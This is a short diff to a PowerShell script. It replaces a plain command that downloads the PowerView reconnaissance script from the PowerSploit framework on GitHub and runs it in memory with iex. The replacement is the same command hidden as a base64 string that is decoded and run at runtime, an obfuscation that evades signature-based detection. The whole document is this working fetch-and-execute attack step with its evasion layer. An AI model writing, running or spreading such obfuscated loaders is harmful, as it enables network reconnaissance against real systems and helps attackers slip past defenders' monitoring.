@@ -1,1 +1,2 @@
-iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 -UseBasicParsing | iex
+$e='aXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvcmVmcy9oZWFkcy9tYXN0ZXIvUmVjb24vUG93ZXJWaWV3LnBzMSAtVXNlQmFzaWNQYXJzaW5nIHwg
+aWV4';iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e)))
